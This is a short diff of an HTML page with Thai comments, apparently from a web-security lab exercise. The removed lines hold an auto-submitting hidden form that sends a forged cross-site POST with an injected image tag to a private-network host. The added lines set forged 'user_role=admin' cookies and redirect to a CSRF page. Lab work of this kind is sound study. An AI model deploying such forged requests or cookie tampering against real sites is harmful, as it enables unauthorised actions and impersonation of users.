@@ -1,26 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="th">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hehe</title>
+  <meta charset="utf-8" />
+  <title>Set Cookie and Redirect</title>
 </head>
-<style>
-    button {
-        align-items: center;
-    }
-</style>
 <body>
-    <!-- หน้าใน siteA (ง่ายๆ) -->
-    <form id="csrfForm" action="http://192.168.39.2" method="POST">
-        <textarea hidden id="content" name="content"></textarea>
-    </form>
-    
-</body>
-<script>
-    window.addEventListener('load', function (){
-        document.getElementById('content').value = '<img src="https://media1.tenor.com/m/x8v1oNUOmg4AAAAd/rickroll-roll.gif">';
-        document.getElementById('csrfForm').submit();
+
+  <script>
+    window.addEventListener('load', function () {
+      // ตั้ง cookie สองตัว
+      document.cookie = 'user_role=admin; path=/; max-age=3600';
+      document.cookie = 'username=admin; path=/; max-age=3600';
+
+      // รอ 1.5 วินาทีแล้วเปลี่ยนหน้า (แก้ URL ตามต้องการ)
+      setTimeout(function () {
+        // เปลี่ยนเป็นหน้า welcome.html หรือ URL ใดก็ได้
+        // ใช้ replace ไม่เก็บหน้าปัจจุบันใน history (ถ้าต้องการเก็บให้ใช้ location.href)
+        window.location.replace('csrf.html');
+      }, 1500);
     });
-</script>
+  </script>
+</body>
 </html>
